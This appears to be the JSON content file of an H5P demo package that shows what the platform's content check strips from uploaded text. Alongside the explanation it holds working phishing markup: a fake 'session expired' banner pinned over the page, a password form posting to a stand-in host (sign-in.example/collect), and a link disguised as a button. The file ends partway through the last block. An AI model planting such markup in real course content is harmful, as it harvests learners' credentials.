{
  "content": [
    {
      "content": {
        "library": "H5P.AdvancedText 1.1",
        "params": {
          "text": "<h2>Markup the content check removes</h2><p>The text below holds markup an author could not have saved on an H5P site: a notice pinned over the content, a sign-in form and a link dressed as a button. Played <strong>Trusted</strong>, it shows as written. Switch to <strong>Untrusted</strong> and the content check removes what the field does not allow before the content starts, as the H5P plugins for Moodle, WordPress and Drupal do when an author uploads it. Words and the colours an author may choose stay.</p><p>None of it runs a script in either mode: the frame&rsquo;s policy refuses inline scripts and handlers, and would refuse to send the form. What markup does without a script, asking a learner for a password, is the risk.</p>"
        },
        "subContentId": "8f3c2a61-4b7e-4d2a-9c11-5e6f7a8b9c01",
        "metadata": {
          "contentType": "Text",
          "license": "U",
          "title": "What this package is"
        }
      },
      "useSeparator": "auto"
    },
    {
      "content": {
        "library": "H5P.AdvancedText 1.1",
        "params": {
          "text": "<div style=\"position:fixed;top:0;left:0;right:0;z-index:2147483647;padding:12px 16px;background-color:#b4232a;color:#ffffff;font-weight:bold\">Your session has expired. Sign in below to keep your progress.</div>"
        },
        "subContentId": "3d9b7e42-1c5a-4f8e-8a3b-6c2d1e0f9a02",
        "metadata": {
          "contentType": "Text",
          "license": "U",
          "title": "A notice pinned over the content"
        }
      },
      "useSeparator": "auto"
    },
    {
      "content": {
        "library": "H5P.AdvancedText 1.1",
        "params": {
          "text": "<form action=\"https://sign-in.example/collect\" method=\"post\"><p><label>Email <input type=\"email\" name=\"email\" autocomplete=\"off\"></label></p><p><label>Password <input type=\"password\" name=\"password\" autocomplete=\"off\"></label></p><p><button type=\"submit\">Sign in</button></p></form>"
        },
        "subContentId": "c7e1f093-5a2b-4c6d-9e8f-0a1b2c3d4e03",
        "metadata": {
          "contentType": "Text",
          "license": "U",
          "title": "A sign-in form"
        }
      },
      "useSeparator": "auto"
    },
    {
      "content": {
        "library": "H5P.AdvancedText 1.1",
        "params": {
          "text": "<p><a href=\"https://sign-in.example/\" style=\"display:inline-block;padding:10px 18px;border-radius:6px;background-color:#2f6df6;color:#ffffff;text-decoration:none\">Continue to your course</a></p>"
        },
        "subContentId": "5b2e8d14-9f6a-4a3c-b7d1-2e4f6a8c0b04",
